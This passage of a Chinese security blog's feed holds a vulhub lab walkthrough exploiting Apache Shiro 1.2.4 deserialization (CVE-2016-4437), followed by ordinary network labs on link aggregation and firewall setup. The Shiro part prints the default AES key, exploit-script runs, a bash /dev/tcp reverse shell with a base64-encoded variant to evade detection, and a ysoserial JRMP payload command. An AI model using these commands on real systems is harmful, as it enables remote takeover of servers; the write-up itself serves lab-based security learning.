字段，响应报文中是否有Set-cookie:rememberMe&#x3D;deleteMe字段。</p><p>如果登录失败且勾选了remember选项，响应报文中有Set-cookie:rememberMe&#x3D;deleteMe；当登录成功，且勾选了remember选项，其响应报文如下图，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段。</p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-17%20234618.png" alt="屏幕截图 2024-04-17 234618"></p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>利用脚本或工具进行验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_exploit.py -u http://192.168.100.134:8080</span><br></pre></td></tr></table></figure><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163349162.png" alt="image-20240418163349162"></p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163332946.png" alt="image-20240418163332946"></p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163611522.png" alt="image-20240418163611522"></p><p>成功获取到AES密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;，说明漏洞存在。</p><p>利用dnslog或collaborator进一步验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &quot;ping -c 4 4kp8lyr2idc6mwiqvjbvs6yeh5nvbk.burpcollaborator.net&quot;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185442068.png" alt="image-20240418185442068"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>目标任务：构造cookie获取反弹shell</p><p>nc开启监听，nc -lvvp 6666</p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418170744863.png" alt="image-20240418170744863"></p><p>构造反弹shell的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.100.131/6666 0&gt;&amp;1</span><br><span class="line">命令中包含重定向 ’ &lt; ’ ’ &gt; ’ 和管道符 ’ | ’ 时，需要进行 base64 编码绕过检测。</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>利用序列化工具ysoserial.jar生成payload，并配置监听功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p>这里相当于在攻击机上启动了一个VPS服务，监听7777端口，然后在这个服务上放了一个反弹shell的payload，并用序列化工具ysoserial指定利用链生成可执行bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.200.131&#x2F;6666 0&gt;&amp;1命令的序列化数据payload。当后面有客户端请求服务时，我们搭建的这个JRMP就会返回这段payload。</p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183402795.png" alt="image-20240418183402795"></p><p>如果不配置此项的话，直接连接，会出现如下情况，无法成功获取shell</p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418183458178.png" alt="image-20240418183458178"></p><p>利用脚本构造出cooikie信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro.py 192.168.100.131:7777</span><br></pre></td></tr></table></figure><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418171624073.png" alt="image-20240418171624073"></p><p>BP抓包（勾选remember选项），加入将生成的内容加入到cookie中并发送</p><p>注意要将cookie中原有的内容删去，再添加构造的内容作为cookie发送</p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20174103.png" alt="屏幕截图 2024-04-18 174103"></p><p>然后回到kali发现获取到了shell</p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174311802.png" alt="image-20240418174311802"></p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418174424393.png" alt="image-20240418174424393"></p><p>也可以nc开启监听后，直接进行如下命令（脚本将上面的步骤整合到一起了），同样能够获取shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_exploit.py -t 3 -u 192.168.100.134:8080 -p &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418185029472.png" alt="image-20240418185029472"></p><p>或直接工具进行漏洞利用</p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223333.png" alt="屏幕截图 2024-04-18 223333"></p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418231659688.png" alt="image-20240418231659688"></p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223718.png" alt="屏幕截图 2024-04-18 223718"></p><p><img src="/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20223753.png" alt="屏幕截图 2024-04-18 223753"></p><p><strong>过程中遇见的问题以及解决方法</strong></p><p>总体上，就是脚本运行的环境问题，环境不适配导致一系列报错</p><p>首先，需要pyhton2版本，包括pip2，在kali上装pip2可以，先访问网址<a href="https://bootstrap.pypa.io/pip/2.7/get-pip.py%EF%BC%8C%E8%8E%B7%E5%8F%96get-pip.py%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%B0%86%E4%B8%8B%E8%BD%BD%E5%A5%BD%E7%9A%84get-pip.py%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%88%B0Kali%E4%B8%8A%E3%80%82%E5%9C%A8Kali%E7%BB%88%E7%AB%AF%E4%B8%AD%EF%BC%8C%E4%BD%BF%E7%94%A8python2%E6%89%A7%E8%A1%8Cget-pip.py%E6%96%87%E4%BB%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9Asudo">https://bootstrap.pypa.io/pip/2.7/get-pip.py，获取get-pip.py文件内容，将下载好的get-pip.py文件传输到Kali上。在Kali终端中，使用python2执行get-pip.py文件，命令如下：sudo</a> python2 get-pip.py即可。运行脚本时报错No module named ‘Crypto’，则运行如下命令：pip2 install pycryptodome，（还有问题可以尝试卸载重装该模块，即pip uninstall与install），然后使用pyhton2运行脚本即可。</p><p>然后就是java的版本过高，工具无法正常使用（需要java8版本），可以参考文章<a href="https://blog.csdn.net/huayimy/article/details/130273362">https://blog.csdn.net/huayimy/article/details/130273362</a></p><p><strong>知识点补充：</strong></p><p>内存马</p><p>普通的木马是写入一个文件去访问,恶意代码是依靠于文件的，执行后就会在内存中被释放掉，但是内存马是依赖于程序本身的动态注册,会在内存中进行一个保存,视为程序的一部分.实现脱离文件后依旧可以运行。</p><p>JRMP</p><p>Java远程方法协议（Java Remote Method Protocol，JRMP），适用于RMI过程中的协议，只有使用这个协议，方法调用双方才能正常进行数据交流。</p><p>RMI</p><p>远程方法调用(Remote Method Invocation)。远程调用服务器上对象的一种接口。能够让在某个java虚拟机上的对象像调用本地对象一样调用另一个java 虚拟机中的对象上的方法。</p><p>参考文章：</p><p><a href="https://blog.csdn.net/Bossfrank/article/details/130173880">https://blog.csdn.net/Bossfrank/article/details/130173880</a></p><p><a href="https://www.freebuf.com/articles/web/372862.html">https://www.freebuf.com/articles/web/372862.html</a></p><p><a href="https://blog.csdn.net/qq_44159028/article/details/115290013">https://blog.csdn.net/qq_44159028/article/details/115290013</a></p><p><a href="https://blog.csdn.net/huayimy/article/details/130273362">https://blog.csdn.net/huayimy/article/details/130273362</a></p><p><a href="https://www.freebuf.com/articles/web/379047.html">https://www.freebuf.com/articles/web/379047.html</a></p><p><a href="https://blog.csdn.net/Candyys/article/details/106038761">https://blog.csdn.net/Candyys/article/details/106038761</a></p><p><a href="https://ares-x.com/tools/runtime-exec">https://ares-x.com/tools/runtime-exec</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）&quot;&gt;&lt;a href=&quot;#【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="靶场" scheme="https://w-sqrt7.github.io/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="vulhub" scheme="https://w-sqrt7.github.io/categories/%E9%9D%B6%E5%9C%BA/vulhub/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="靶场" scheme="https://w-sqrt7.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="vulhub" scheme="https://w-sqrt7.github.io/tags/vulhub/"/>
    
  </entry>
  
  <entry>
    <title>网基实践题-链路聚合</title>
    <link href="https://w-sqrt7.github.io/2024/04/16/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/"/>
    <id>https://w-sqrt7.github.io/2024/04/16/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/</id>
    <published>2024-04-16T03:39:01.138Z</published>
    <updated>2024-04-16T03:39:43.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网基实践题-链路聚合"><a href="#网基实践题-链路聚合" class="headerlink" title="网基实践题-链路聚合"></a>网基实践题-链路聚合</h1><h2 id="实验拓扑图："><a href="#实验拓扑图：" class="headerlink" title="实验拓扑图："></a>实验拓扑图：</h2><p><img src="/2024/04/16/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-16%20111917.png" alt="屏幕截图 2024-04-16 111917"></p><h2 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h2><p>1.配置pc机的ip网关等</p><p>这里不在赘述</p><p>2.在SW1和SW2上进行基础配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[SW1]vlan batch 10 20</span><br><span class="line">[SW1]int e0/0/1</span><br><span class="line">[SW1-Ethernet0/0/1]port link-type access</span><br><span class="line">[SW1-Ethernet0/0/1]port default vlan 10</span><br><span class="line">[SW1-Ethernet0/0/1]quit</span><br><span class="line">[SW1]int e0/0/2</span><br><span class="line">[SW1-Ethernet0/0/2]port link-type access</span><br><span class="line">[SW1-Ethernet0/0/2]port default vlan 20</span><br><span class="line">[SW1-Ethernet0/0/2]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[SW2]vlan batch 10 20</span><br><span class="line">[SW2]int vlanif 10</span><br><span class="line">[SW2-Vlanif10]ip address 192.168.10.254 24</span><br><span class="line">[SW2-Vlanif10]quit</span><br><span class="line">[SW2]int vlanif 20</span><br><span class="line">[SW2-Vlanif20]ip address 192.168.20.254 24</span><br><span class="line">[SW2-Vlanif20]quit</span><br></pre></td></tr></table></figure><p>3.进行链路聚合配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[SW1]int Eth-Trunk 1</span><br><span class="line">[SW1-Eth-Trunk1]quit</span><br><span class="line">[SW1]int e0/0/5</span><br><span class="line">[SW1-Ethernet0/0/5]eth-trunk 1</span><br><span class="line">[SW1-Ethernet0/0/5]quit</span><br><span class="line">[SW1]int e0/0/6</span><br><span class="line">[SW1-Ethernet0/0/6]eth-trunk 1</span><br><span class="line">[SW1-Ethernet0/0/6]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[SW2]int Eth-Trunk 1</span><br><span class="line">[SW2-Eth-Trunk1]quit</span><br><span class="line">[SW2]int e0/0/1</span><br><span class="line">[SW2-Ethernet0/0/1]eth-trunk 1</span><br><span class="line">[SW2-Ethernet0/0/1]quit</span><br><span class="line">[SW2]int e0/0/4</span><br><span class="line">[SW2-Ethernet0/0/4]eth-trunk 1</span><br><span class="line">[SW2-Ethernet0/0/4]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]int Eth-Trunk 1</span><br><span class="line">[SW1-Eth-Trunk1]port link-type trunk</span><br><span class="line">[SW1-Eth-Trunk1]port trunk allow-pass vlan 10 20</span><br><span class="line">[SW1-Eth-Trunk1]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW2]int Eth-Trunk 1</span><br><span class="line">[SW2-Eth-Trunk1]port link-type trunk</span><br><span class="line">[SW2-Eth-Trunk1]port trunk allow-pass vlan 10 20</span><br><span class="line">[SW2-Eth-Trunk1]quit</span><br></pre></td></tr></table></figure><p>然后进行测试，结果为两台主机之间可以互相ping通</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网基实践题-链路聚合&quot;&gt;&lt;a href=&quot;#网基实践题-链路聚合&quot; class=&quot;headerlink&quot; title=&quot;网基实践题-链路聚合&quot;&gt;&lt;/a&gt;网基实践题-链路聚合&lt;/h1&gt;&lt;h2 id=&quot;实验拓扑图：&quot;&gt;&lt;a href=&quot;#实验拓扑图：&quot; class=&quot;</summary>
      
    
    
    
    <category term="信息安全产品配置与应用" scheme="https://w-sqrt7.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="原创" scheme="https://w-sqrt7.github.io/tags/%E5%8E%9F%E5%88%9B/"/>
    
    <category term="网基" scheme="https://w-sqrt7.github.io/tags/%E7%BD%91%E5%9F%BA/"/>
    
    <category term="eNSP" scheme="https://w-sqrt7.github.io/tags/eNSP/"/>
    
  </entry>
  
  <entry>
    <title>网基实践题-防火墙配置</title>
    <link href="https://w-sqrt7.github.io/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/"/>
    <id>https://w-sqrt7.github.io/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/</id>
    <published>2024-04-11T11:32:04.546Z</published>
    <updated>2024-04-16T03:15:20.924Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网基实践题-防火墙配置"><a href="#网基实践题-防火墙配置" class="headerlink" title="网基实践题-防火墙配置"></a>网基实践题-防火墙配置</h1><h2 id="实验拓扑图一："><a href="#实验拓扑图一：" class="headerlink" title="实验拓扑图一："></a>实验拓扑图一：</h2><p><img src="/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240411185710090.png" alt="image-20240411185710090"></p><h2 id="实验过程："><a href="#实验过程：" class="headerlink" title="实验过程："></a>实验过程：</h2><p>1.首先配置云(cloud1)，根据自己的虚拟网卡配置，具体操作参考下图</p><p><img src="/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-11%20185831.png" alt="屏幕截图 2024-04-11 185831"></p><p>2.然后配置防火墙，首先配本地访问的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[USG6000V1]int g0/0/0</span><br><span class="line">[USG6000V1-GigabitEthernet0/0/0]ip address 192.168.100.18 24</span><br><span class="line">[USG6000V1-GigabitEthernet0/0/0]service-manage enable#防火墙安全策略配置管理协议启用访问管理</span><br><span class="line">[USG6000V1-GigabitEthernet0/0/0]service-manage ping permit#允许ping防火墙</span><br><span class="line">[USG6000V1-GigabitEthernet0/0/0]service-manage http permit </span><br><span class="line">[USG6000V1-GigabitEthernet0/0/0]service-manage https permit#允许浏览器访问防火墙进行配置</span><br><span class="line">[USG6000V1-GigabitEthernet0/0/0]quit</span><br></pre></td></tr></table></figure><p>配置完成后，可以使用ping命令先测试，测试成功后，浏览器访问登录</p><img src="/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240411190516243.png" alt="image-20240411190516243" style="zoom:50%;"><img src="/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240411190607110.png" alt="image-20240411190607110" style="zoom: 33%;"><p>3.然后配置防火墙安全区域，即使pc1能够和防火墙正常通信</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[USG6000V1]int g1/0/0</span><br><span class="line">[USG6000V1-GigabitEthernet1/0/0]ip address 192.168.100.20 24</span><br><span class="line">[USG6000V1-GigabitEthernet1/0/0]service-manage enable </span><br><span class="line">[USG6000V1-GigabitEthernet1/0/0]service-manage all permit </span><br><span class="line">[USG6000V1-GigabitEthernet1/0/0]quit</span><br><span class="line">[USG6000V1]firewall zone trust #进入trust区域</span><br><span class="line">[USG6000V1-zone-trust]add interface g1/0/0#将接口G1/0/0添加到trust区域中</span><br><span class="line">[USG6000V1-zone-trust]quit</span><br></pre></td></tr></table></figure><p>然后再尝试利用pc机ping防火墙，可以正常通信。</p><h2 id="实验拓扑图二："><a href="#实验拓扑图二：" class="headerlink" title="实验拓扑图二："></a>实验拓扑图二：</h2><p><img src="/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240416094036246.png" alt="image-20240416094036246"></p><h2 id="实验过程：-1"><a href="#实验过程：-1" class="headerlink" title="实验过程："></a>实验过程：</h2><p>1.首先配置pc1和pc2，注意网关</p><p><img src="/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240416094200587.png" alt="image-20240416094200587"></p><p><img src="/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240416094249574.png" alt="image-20240416094249574"></p><p>2.然后配置防火墙的两个端口，就是刚才两台pc机的网关。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;USG6000V1&gt;sys</span><br><span class="line">[USG6000V1]sysname FW1</span><br><span class="line">[FW1]int g1/0/0</span><br><span class="line">[FW1-GigabitEthernet1/0/0]ip address 10.1.2.2 24</span><br><span class="line">[FW1-GigabitEthernet1/0/0]quit</span><br><span class="line">[FW1]int g1/0/1</span><br><span class="line">[FW1-GigabitEthernet1/0/1]ip address 2.2.2.1 24</span><br><span class="line">[FW1-GigabitEthernet1/0/1]quit</span><br></pre></td></tr></table></figure><p>3.然后配置各端口上的service-manage，保证ping命令能够允许</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[FW1]int g1/0/0</span><br><span class="line">[FW1-GigabitEthernet1/0/0]service-manage enable</span><br><span class="line">[FW1-GigabitEthernet1/0/0]service-manage ping permit</span><br><span class="line">[FW1-GigabitEthernet1/0/0]quit</span><br><span class="line">[FW1]int g1/0/1</span><br><span class="line">[FW1-GigabitEthernet1/0/1]service-manage enable </span><br><span class="line">[FW1-GigabitEthernet1/0/1]service-manage ping permit </span><br><span class="line">[FW1-GigabitEthernet1/0/1]quit</span><br></pre></td></tr></table></figure><p>4.然后配置不同的安全区域并加入对应的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[FW1]firewall zone trust</span><br><span class="line">[FW1-zone-trust]add interface g1/0/0</span><br><span class="line">[FW1-zone-trust]quit</span><br><span class="line">[FW1]firewall zone untrust</span><br><span class="line">[FW1-zone-untrust]add interface g1/0/1</span><br><span class="line">[FW1-zone-untrust]quit</span><br></pre></td></tr></table></figure><p>5.然后开始配置安全策略，使pc1可以ping通pc2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[FW1]security-policy</span><br><span class="line">[FW1-policy-security]rule name 1</span><br><span class="line">[FW1-policy-security-rule-1]source-address 10.1.2.1 mask 255.255.255.0</span><br><span class="line">[FW1-policy-security-rule-1]destination-address 2.2.2.2 mask 255.255.255.0</span><br><span class="line">[FW1-policy-security-rule-1]service icmp</span><br><span class="line">[FW1-policy-security-rule-1]action permit</span><br><span class="line">[FW1-policy-security-rule-1]quit</span><br></pre></td></tr></table></figure><p>然后进行验证，结果应当是pc1可以ping通pc2，但是pc2无法ping通pc1</p><h2 id="实验拓扑图三："><a href="#实验拓扑图三：" class="headerlink" title="实验拓扑图三："></a>实验拓扑图三：</h2><p><img src="/2024/04/11/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/image-20240416104546562.png" alt="image-20240416104546562"></p><h2 id="实验过程：-2"><a href="#实验过程：-2" class="headerlink" title="实验过程："></a>实验过程：</h2><p>1.首先配置pc机的ip网关以及各个设备的端口的ip，具体如上图</p><p>这边就不在展示了，很基础的，就给各个端口配各ip，注意不要漏了，这里就先只配ip，其他的暂时不要动，跟着后面的步骤走</p><p>2.然后开始配置两个防火墙的端口的service-manage</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[FW1]int g1/0/0</span><br><span class="line">[FW1-GigabitEthernet1/0/0]service-manage enable </span><br><span class="line">[FW1-GigabitEthernet1/0/0]service-manage ping permit </span><br><span class="line">[FW1-GigabitEthernet1/0/0]quit</span><br><span class="line">[FW1]int g1/0/1</span><br><span class="line">[FW1-GigabitEthernet1/0/1]service-manage enable </span><br><span class="line">[FW1-GigabitEthernet1/0/1]service-manage ping permit </span><br><span class="line">[FW1-GigabitEthernet1/0/1]quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 